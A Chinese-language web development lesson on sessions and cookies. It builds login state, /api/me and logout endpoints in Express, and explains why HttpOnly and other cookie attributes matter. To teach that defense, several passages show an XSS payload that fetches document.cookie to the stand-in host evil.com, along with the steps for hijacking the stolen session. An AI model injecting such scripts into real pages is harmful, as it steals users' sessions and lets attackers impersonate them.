# 第 57 课：Session 与 Cookie

## 学习目标

- 理解 HTTP 无状态的含义和问题
- 理解 Session 和 Cookie 的工作原理
- 实现登录后保持登录态：`GET /api/me` 能认出当前用户
- 实现退出登录：`POST /api/logout`

---

## 核心概念讲解

### 1. HTTP 无状态问题

上节课登录成功后，下一个请求服务器完全不记得你：

```
请求 1: POST /api/login  →  "login successful"
请求 2: GET  /api/me     →  服务器：你是谁？我不知道。
```

每个 HTTP 请求都是独立的，服务器不会自动记住"刚才那个人登录过"。

**类比**：你去银行柜台办业务，每次柜员都像第一次见到你一样问"您是谁？"。你需要一个**号码牌**——办完第一件事后拿到号码牌，下次来出示号码牌，柜员就知道你是谁了。

### 2. Cookie 和 Session 是什么？

| 概念 | 存在哪 | 是什么 | 类比 |
|------|--------|--------|------|
| **Session** | 服务器内存 | 一张表，记录"sessionId → 用户名" | 银行内部的客户登记表 |
| **Cookie** | 浏览器 | 一小段数据，浏览器自动附在每次请求上 | 你手里的号码牌 |

### 3. 完整流程

```
登录时：
  浏览器 ──POST /api/login──→ 服务器
                                  │
                                  验证密码成功
                                  生成随机 sessionId: "abc123"
                                  记录 sessions["abc123"] = "alice"
                                  │
  浏览器 ←──Set-Cookie: sessionId=abc123── 服务器
     │
     浏览器自动保存 cookie

后续请求：
  浏览器 ──GET /api/me──→ 服务器
    Cookie: sessionId=abc123      │
                                  查 sessions["abc123"] → "alice"
                                  知道是 alice 在访问
                                  │
  浏览器 ←──{"username":"alice"}── 服务器
```

**关键**：浏览器会自动把 Cookie 附在每次请求上，不需要你手动操作。这就是为什么登录一次后，刷新页面仍然是登录状态。

### 4. Cookie 的属性

```ts
res.setHeader("Set-Cookie", `sessionId=${sessionId}; HttpOnly; Path=/`);
```

### 5. Cookie 属性详解

#### HttpOnly

先忘掉"安全"这个词，我们一步步看 Cookie 是怎么工作的。

**第一步：Cookie 的正常工作方式**

登录后，浏览器收到 `Set-Cookie: sessionId=abc123`。之后每次请求，浏览器**自动**把这个 Cookie 附上：

```
浏览器                          你的服务器
  │                                │
  │  GET /api/me                   │
  │  Cookie: sessionId=abc123  →   │  服务器：哦，是 alice
```

这个过程不需要 JS 参与，浏览器自己做的。**这是 Cookie 的正常用途。**

**第二步：XSS 攻击是怎么偷走 Cookie 的？**

先理解 XSS（Cross-Site Scripting，跨站脚本攻击）。名字听起来吓人，其实很简单：

**XSS = 攻击者把自己的 JS 代码注入到你的网页里，让它在其他用户的浏览器中执行。**

怎么注入？最常见的方式：网站有一个评论区，但没有过滤用户输入。攻击者提交的"评论"不是文字，而是一段 `<script>` 标签：

```
用户 alice（正常评论）：
  "这篇文章写得真好！"

攻击者（恶意评论）：
  "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"
```

如果网站直接把评论内容拼到 HTML 里：

```html
<div class="comment">这篇文章写得真好！</div>
<div class="comment"><script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script></div>
```

浏览器渲染这个页面时，看到 `<script>` 标签就会**执行里面的 JS 代码**。这段代码做了什么？

```js
fetch('https://evil.com/steal?cookie=' + document.cookie)
```

逐段拆解：

- `document.cookie` — 读取当前页面的所有 Cookie（不含 HttpOnly 的），比如 `"sessionId=abc123"`
- `'https://evil.com/steal?cookie=' + document.cookie` — 拼接出一个 URL：`https://evil.com/steal?cookie=sessionId=abc123`
- `fetch(...)` — 向这个 URL 发一个 GET 请求

从攻击者服务器的视角看，它的日志里会出现：

```
GET /steal?cookie=sessionId=abc123  ← 来自受害者 alice 的浏览器
```

攻击者拿到了 `sessionId=abc123`。然后他打开自己的浏览器，手动设置 Cookie：

```
document.cookie = "sessionId=abc123"
```

再访问你的网站，服务器看到 Cookie 里的 `sessionId=abc123`，查 sessions 表 → `"alice"`，以为攻击者就是 alice。

**整个过程：**

```
1. 攻击者在评论区注入 <script> 标签
2. alice 打开评论区页面 → 浏览器执行了恶意脚本
3. 脚本读取 document.cookie → 得到 sessionId=abc123
4. 脚本 fetch 到 evil.com/steal?cookie=sessionId=abc123
5. 攻击者查看 evil.com 的日志，拿到 sessionId
6. 攻击者把 sessionId 设到自己的 Cookie 里
7. 攻击者访问你的网站 → 服务器以为他是 alice
```

> **注意**：`fetch` 到攻击者服务器这一步，alice 完全感知不到——浏览器在后台静默发送，页面没有任何变化。

**第三步：HttpOnly 做了什么？**

加了 `HttpOnly` 后，浏览器依然会自动在请求里带上 Cookie（服务器正常工作），但 `document.cookie` 返回空字符串：

```
不加 HttpOnly：
  document.cookie  →  "sessionId=abc123"   ← JS 能读到

加了 HttpOnly：
  document.cookie  →  ""                   ← JS 读不到
```

所以即使攻击者注入了恶意脚本，`document.cookie` 也是空的，偷不到 sessionId。

**一句话总结**：HttpOnly 不是阻止 Cookie 发送，而是阻止 JS **读取** Cookie。浏览器照样自动发，服务器照样正常收，但恶意脚本偷不走。

**类比**：Cookie 就像你钱包里的身份证。正常使用时，你自己掏出来给柜员看（浏览器自动发送）。HttpOnly 相当于在身份证上套了一个透明封套——你自己可以拿出来用，但旁边的小偷（恶意脚本）伸手摸不到。

---

#### Path

```ts
Set-Cookie: sessionId=abc123; Path=/
```

`Path` 控制 Cookie 对哪些 URL 路径生效。浏览器只在访问匹配的路径时，才把这个 Cookie 附在请求上。

| 设置 | 生效范围 |
|------|----------|
| `Path=/` | 整个网站所有路径（`/`、`/api/me`、`/game` 等） |
| `Path=/api` | 只在 `/api` 及其子路径下（`/api/me`、`/api/items`） |
| `Path=/admin` | 只在 `/admin` 及其子路径下 |

**为什么需要 Path？**

假设一个网站有两个独立区域：

```
/admin     → 后台管理（需要管理员 Cookie）
/blog      → 公开博客（不需要 Cookie）
```

如果后台的 Cookie 设了 `Path=/admin`，浏览器访问 `/blog` 时就不会发送这个 Cookie。好处：

1. **减少不必要的数据传输**：每个请求少发一个 Cookie，省带宽
2. **安全性**：即使 `/blog` 页面有 XSS 漏洞，攻击者也拿不到 `/admin` 路径的 Cookie

**我们为什么用 `Path=/`？**

因为我们的 sessionId 需要在整个网站生效——不管是访问 `/api/me` 还是未来的 `/api/game`，服务器都需要知道你是谁。

#### 其他常用属性

| 属性 | 含义 | 示例 |
|------|------|------|
| `Max-Age` | Cookie 存活时间（秒） | `Max-Age=3600`（1小时后过期） |
| `Expires` | Cookie 过期时间（具体日期） | `Expires=Wed, 21 Oct 2026 07:28:00 GMT` |
| `Secure` | 只在 HTTPS 连接中发送 | 生产环境必须加 |
| `SameSite` | 跨站请求时是否发送 | `SameSite=Lax`（默认，防 CSRF） |

退出登录时用 `Max-Age=0` 来删除 Cookie：

```ts
res.setHeader("Set-Cookie", "sessionId=; HttpOnly; Path=/; Max-Age=0");
```

- `sessionId=` 值为空
- `Max-Age=0` 告诉浏览器"这个 Cookie 已经过期，立即删除"

---

## 逐行代码讲解

### Session 存储

```ts
const sessions: Record<string, string> = {};
```

- 内存中的一张表：键是 sessionId，值是用户名
- 目前存在内存里，服务器重启就没了（后续可以存文件或数据库）

### 解析 Cookie

```ts
function parseCookies(cookieHeader: string | undefined): Record<string, string> {
  const cookies: Record<string, string> = {};
  if (!cookieHeader) return cookies;
  for (const pair of cookieHeader.split(";")) {
    const [key, ...rest] = pair.trim().split("=");
    cookies[key] = rest.join("=");
  }
  return cookies;
}
```

- 浏览器发来的 Cookie 是一个字符串：`"sessionId=abc123; otherKey=value"`
- `split(";")` 按分号拆成 `["sessionId=abc123", " otherKey=value"]`
- 每个再按 `=` 拆成键值对
- `...rest` + `rest.join("=")` 处理值里可能包含 `=` 的情况

### 登录时创建 Session

```ts
const sessionId = crypto.randomBytes(32).toString("hex");
sessions[sessionId] = username;

res.setHeader("Set-Cookie", `sessionId=${sessionId}; HttpOnly; Path=/`);
```

- 生成 32 字节（256 位）的随机 sessionId，足够安全
- 在 sessions 表中记录"这个 sessionId 属于谁"
- 通过 `Set-Cookie` 响应头，让浏览器保存这个 sessionId

### GET /api/me（验证登录态）

```ts
app.get("/api/me", (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const sessionId = cookies.sessionId;

  if (!sessionId || !sessions[sessionId]) {
    res.status(401).json({ error: "not logged in" });
    return;
  }

  res.json({ username: sessions[sessionId] });
});
```

- 从请求头中解析 Cookie，拿到 sessionId
- 查 sessions 表：如果 sessionId 不存在或已过期，返回 401
- 如果存在，返回对应的用户名

### POST /api/logout（退出登录）

```ts
app.post("/api/logout", (req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  const sessionId = cookies.sessionId;

  if (sessionId) {
    delete sessions[sessionId];
  }

  res.setHeader("Set-Cookie", "sessionId=; HttpOnly; Path=/; Max-Age=0");
  res.json({ message: "logged out" });
});
```

- 从 sessions 表中删除该 sessionId
- 告诉浏览器删除 Cookie（`Max-Age=0`）

---

## curl 测试中的 Cookie 操作

```bash
# -c 保存服务器返回的 Cookie 到文件
curl -c /tmp/cookies.txt -X POST .../api/login ...

# -b 从文件读取 Cookie 并附在请求上
curl -b /tmp/cookies.txt .../api/me
```

浏览器里这些操作是自动的——你不需要手动管理 Cookie。

---

## 本课产出

- `server/index-express.ts`：新增 Session 管理、`GET /api/me`、`POST /api/logout`

### 验证方式

```bash
npx tsx server/index-express.ts

# 未登录
curl http://localhost:3001/api/me
# → {"error":"not logged in"}

# 登录并保存 cookie
curl -c /tmp/cookies.txt -X POST http://localhost:3001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"secret123"}'

# 带着 cookie 访问
curl -b /tmp/cookies.txt http://localhost:3001/api/me
# → {"username":"alice"}

# 退出
curl -b /tmp/cookies.txt -X POST http://localhost:3001/api/logout

# 退出后再访问
curl -b /tmp/cookies.txt http://localhost:3001/api/me
# → {"error":"not logged in"}
```

---

## 思考题

1. Session 存在服务器内存里，服务器重启后会怎样？怎么解决？
2. `HttpOnly` 的作用是什么？如果去掉会有什么风险？
3. 如果用户换了一个浏览器（或清除了 Cookie），还能被认出来吗？

---

## 思考题答案

### 1. Session 存在服务器内存里，服务器重启后会怎样？怎么解决？

**重启后**：`const sessions = {}` 被重置为空对象，所有用户的登录态全部丢失。已经登录的用户刷新页面后变成未登录状态。

**解法**：把 Session 存到持久化存储中，而不是内存里：

| 方案 | 实现 | 优缺点 |
|------|------|--------|
| 存到文件 | `fs.writeFileSync("sessions.json", ...)` | 简单，但并发读写有问题 |
| 存到数据库 | 下一课的 SQLite | 可靠，支持并发 |
| 存到 Redis | 专业的内存数据库 | 速度快，生产环境常用 |

本课用内存是因为还没学到数据库。下一课就会把用户数据和 Session 都迁移到 SQLite。

### 2. `HttpOnly` 的作用是什么？如果去掉会有什么风险？

**作用**：阻止 JavaScript 通过 `document.cookie` 读取 Cookie。

**去掉的风险**：如果网站存在 XSS 漏洞（攻击者注入了恶意脚本），脚本可以一行代码偷走 sessionId：

```js
fetch("https://evil.com/steal?cookie=" + document.cookie)
```

攻击者拿到 sessionId 后就能冒充用户身份。

**加了 HttpOnly 之后**，即使有 XSS 漏洞，`document.cookie` 也读不到 sessionId，攻击者偷不走。

> 但要注意：HttpOnly **只能防 Cookie 被偷**，不能防 XSS 攻击本身。如果攻击者注入了脚本，他仍然可以做其他坏事（比如直接在当前页面发请求，因为浏览器会自动带上 Cookie）。**防御 XSS 的根本方法是：永远不要直接把用户输入拼到 HTML 里，要做转义处理。**

### 3. 如果用户换了一个浏览器（或清除了 Cookie），还能被认出来吗？

**不能**。Cookie 存在浏览器本地，换浏览器或清除 Cookie 后，旧的 sessionId 就丢失了。

服务器那边的 sessions 表里还有旧 sessionId 的记录，但用户的浏览器不再发送它。服务器看到的是一个没有 Cookie 的请求 → 返回 401 "not logged in"。

用户需要重新登录，获取新的 sessionId。

**类比**：Cookie 就像餐厅给你的号码牌。你把号码牌弄丢了（清除 Cookie），或者换了一家分店（换浏览器），服务员就不认识你了。你得重新点菜（重新登录），拿一个新的号码牌。

---

## 下一课预告

第 58 课引入 **SQLite 数据库**，把用户数据和 Session 从文件/内存迁移到真正的数据库中。
